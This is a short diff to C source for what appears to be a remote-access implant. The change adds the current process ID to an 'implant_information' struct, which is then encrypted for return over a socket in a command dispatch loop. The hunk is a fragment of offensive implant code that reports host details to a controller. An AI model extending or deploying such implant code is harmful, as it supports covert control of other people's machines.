@@ -183,6 +183,8 @@ LONG main_dispatch_loop(SOCKET hConnect, PULONG *base_library, BCRYPT_KEY_HANDLE
 			implant_information.buildno_major = HIWORD(pFixed->dwFileVersionLS);
 			implant_information.buildno_minor = LOWORD(pFixed->dwFileVersionLS);
 
+			implant_information.current_pid = GetCurrentProcessId();
+
 			PUCHAR encrypted_implant_info;
 			ULONG encrypted_implant_info_length;
 			encrypt_data(key, (unsigned char*)&implant_information, sizeof(IMPLANTINFO), encrypted_implant_info, encrypted_implant_info_length);
